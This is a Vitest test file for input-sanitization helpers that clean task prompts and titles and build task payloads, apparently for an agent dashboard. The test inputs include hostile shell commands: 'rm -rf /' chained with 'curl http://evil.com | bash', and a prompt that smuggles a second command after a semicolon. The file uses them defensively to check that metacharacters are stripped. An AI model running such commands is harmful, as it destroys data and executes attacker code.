import { describe, it, expect } from 'vitest';
import { sanitizePrompt, sanitizeTitle, buildTaskPayload } from './sanitize';

describe('sanitizePrompt', () => {
  it('returns trimmed prompt with no metacharacters', () => {
    expect(sanitizePrompt('  hello world  ')).toBe('hello world');
  });

  it('strips shell metacharacters', () => {
    const input = 'rm -rf /; echo pwned && curl http://evil.com | bash';
    const result = sanitizePrompt(input);
    expect(result).not.toContain(';');
    expect(result).not.toContain('|');
    expect(result).not.toContain('&');
    expect(result).not.toContain('`');
    expect(result).not.toContain('$');
    expect(result).not.toContain('>');
    expect(result).not.toContain('<');
    expect(result).not.toContain('\\');
    expect(result).not.toContain('(');
    expect(result).not.toContain(')');
    expect(result).not.toContain('[');
    expect(result).not.toContain(']');
    expect(result).not.toContain('{');
    expect(result).not.toContain('}');
    expect(result).not.toContain('!');
    expect(result).not.toContain('#');
    expect(result).not.toContain('~');
  });

  it('throws if prompt is empty', () => {
    expect(() => sanitizePrompt('')).toThrow('Prompt is required');
  });

  it('throws if prompt is whitespace only', () => {
    expect(() => sanitizePrompt('   ')).toThrow('Prompt cannot be empty');
  });

  it('throws if prompt exceeds 10,000 characters', () => {
    const long = 'a'.repeat(10_001);
    expect(() => sanitizePrompt(long)).toThrow('10,000 characters');
  });

  it('accepts prompt exactly 10,000 characters', () => {
    const prompt = 'a'.repeat(10_000);
    expect(() => sanitizePrompt(prompt)).not.toThrow();
    expect(sanitizePrompt(prompt)).toHaveLength(10_000);
  });

  it('throws if prompt is not a string', () => {
    expect(() => sanitizePrompt(null as unknown as string)).toThrow('Prompt is required');
    expect(() => sanitizePrompt(undefined as unknown as string)).toThrow('Prompt is required');
  });

  it('preserves normal text after stripping metacharacters', () => {
    expect(sanitizePrompt('Write a Python function to sort a list')).toBe(
      'Write a Python function to sort a list',
    );
  });
});

describe('sanitizeTitle', () => {
  it('returns undefined for undefined input', () => {
    expect(sanitizeTitle(undefined)).toBeUndefined();
  });

  it('returns undefined for null input', () => {
    expect(sanitizeTitle(null as unknown as string)).toBeUndefined();
  });

  it('returns undefined for empty string', () => {
    expect(sanitizeTitle('')).toBeUndefined();
  });

  it('returns undefined for whitespace-only string', () => {
    expect(sanitizeTitle('   ')).toBeUndefined();
  });

  it('trims whitespace', () => {
    expect(sanitizeTitle('  hello  ')).toBe('hello');
  });

  it('truncates to 100 characters', () => {
    const long = 'a'.repeat(200);
    const result = sanitizeTitle(long);
    expect(result).toHaveLength(100);
  });

  it('accepts title exactly 100 characters', () => {
    const title = 'a'.repeat(100);
    expect(sanitizeTitle(title)).toHaveLength(100);
  });

  it('returns normal title unchanged', () => {
    expect(sanitizeTitle('Fix bug in login form')).toBe('Fix bug in login form');
  });
});

describe('buildTaskPayload', () => {
  it('includes required fields', () => {
    const payload = buildTaskPayload('My task', 'do something', 'task-123', 'web-dashboard');
    expect(payload.id).toBe('task-123');
    expect(payload.prompt).toBe('do something');
    expect(payload.createdBy).toBe('web-dashboard');
    expect(typeof payload.createdAt).toBe('string');
  });

  it('includes title when provided', () => {
    const payload = buildTaskPayload('My task', 'do something', 'task-123', 'web-dashboard');
    expect(payload.title).toBe('My task');
  });

  it('omits title when undefined', () => {
    const payload = buildTaskPayload(undefined, 'do something', 'task-123', 'web-dashboard');
    expect('title' in payload).toBe(false);
  });

  it('does NOT include agent, command, or workingDirectory fields', () => {
    const payload = buildTaskPayload('title', 'prompt', 'task-id', 'host');
    expect('agent' in payload).toBe(false);
    expect('command' in payload).toBe(false);
    expect('workingDirectory' in payload).toBe(false);
  });

  it('sanitizes prompt before including in payload', () => {
    const payload = buildTaskPayload(undefined, 'prompt; rm -rf /', 'task-id', 'host');
    expect(payload.prompt as string).not.toContain(';');
  });

  it('throws if prompt is invalid', () => {
    expect(() => buildTaskPayload(undefined, '', 'task-id', 'host')).toThrow();
  });
});
